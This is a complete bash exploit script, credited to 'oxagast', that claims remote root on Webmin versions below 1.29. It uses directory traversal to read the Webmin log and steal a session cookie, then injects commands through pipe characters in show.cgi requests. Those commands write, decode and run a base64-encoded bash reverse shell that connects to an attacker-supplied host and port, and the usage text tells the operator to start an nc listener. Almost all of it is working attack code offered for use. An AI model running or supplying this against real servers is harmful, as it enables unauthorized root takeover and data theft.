#!/bin/bash

HOST=$1;
PORT=$2;
LHOST=$3;
LPORT=$4;
if [ $# -lt 4 ]
  then
echo "Webmin <1.29 remote root exploit by oxagast"
echo "Priv esc by directory transversal to find cookie in logfile file as root, then session highjack into RCE.";
echo "Thanks to UmZ for directory transversal attack; greets to enki for asking me to try this!";
echo "Usage:"
echo "  nc -l -p 7777"
echo "  $0 10.0.0.4 10000 10.0.0.3 7777"
else
CMD=`echo "bash -p -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64`
echo $CMD;
CMD0="echo $CMD > /tmp/b64s"
CMD1='base64 -d /tmp/b64s > /tmp/she11';
CMD2='chmod a+x /tmp/she11';
CMD3='/bin/bash /tmp/she11';
echo "Webmin <1.29 remote root exploit by oxagast"
echo "Server: $HOST:$PORT";
echo "Getting cookie from webmin log...";
SID=`curl $HOST:$PORT/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/var/webmin/webmin.log -s | tail -n 1 | cut -f 5 -d ' ' | tr -d '\n'`;
echo "Setting cookie to: sid=$SID";
echo "Copying base64 encoded shell..."
curl --header "Host: $HOST:$PORT" --header 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header 'Accept-Language: en-US,en;q=0.5' --header "Cookie: testing=1; sid=$SID" --header 'Connection: keep-alive' --header 'Upgrade-Insecure-Requests: 1' "$HOST:$PORT/file/show.cgi/bin/AAAF0|$CMD0|" -s -L
sleep 1
echo "Debase64ing shell...";
curl --header "Host: $HOST:$PORT" --header 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header 'Accept-Language: en-US,en;q=0.5' --header "Cookie: testing=1; sid=$SID" --header 'Connection: keep-alive' --header 'Upgrade-Insecure-Requests: 1' "$HOST:$PORT/file/show.cgi/bin/AAAF1|$CMD1|" -s -L
sleep 1
echo "Chmodding shell...";
curl --header "Host: $HOST:$PORT" --header 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header 'Accept-Language: en-US,en;q=0.5' --header "Cookie: testing=1; sid=$SID" --header 'Connection: keep-alive' --header 'Upgrade-Insecure-Requests: 1' "$HOST:$PORT/file/show.cgi/bin/AAAF2|$CMD2|" -s -L
sleep 1
echo "Trying to spawn...";
curl --header "Host: $HOST:$PORT" --header 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header 'Accept-Language: en-US,en;q=0.5' --header "Cookie: testing=1; sid=$SID" --header 'Connection: keep-alive' --header 'Upgrade-Insecure-Requests: 1' "$HOST:$PORT/file/show.cgi/bin/AAAF3|$CMD3|" -s -L
fi
